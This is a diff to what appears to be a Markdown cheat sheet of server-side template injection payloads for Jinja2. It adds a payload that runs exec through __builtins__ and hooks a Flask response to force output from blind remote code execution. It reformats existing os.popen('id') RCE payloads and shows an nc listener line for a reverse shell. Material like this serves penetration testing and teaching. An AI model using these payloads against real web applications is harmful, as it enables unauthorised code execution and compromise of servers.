@@ -43,6 +43,7 @@
     - [Jinja2 - Read remote file](#jinja2---read-remote-file)
     - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
     - [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
+      - [Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
       - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
       - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
       - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
@@ -496,15 +497,30 @@ Listen for connection
 nc -lnvp 8000
 ```
 
+#### Jinja2 - Forcing output on blind RCE
+
+You can import Flask functions to return an output from the vulnerable page.
+
+```py
+{{
+x.__init__.__builtins__.exec("from flask import current_app, after_this_request
+@after_this_request
+def hook(*args, **kwargs):
+    from flask import make_response
+    r = make_response('Powned')
+    return r
+")
+}}
+```
+
+
 #### Exploit the SSTI by calling os.popen().read()
 
 These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
 
 ```python
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
-
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
-
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
@@ -512,9 +528,7 @@ We can use these shorter payloads (this is the shorter payloads known yet):
 
 ```python
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
-
 {{ joiner.__init__.__globals__.os.popen('id').read() }}
-
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
@@ -1092,3 +1106,4 @@ layout template:
 * [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
 * [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
 * [Django Templates Server-Side Template Injection](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
+* [#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas 'BitK' Philippe](https://youtu.be/M0b_KA0OMFw)
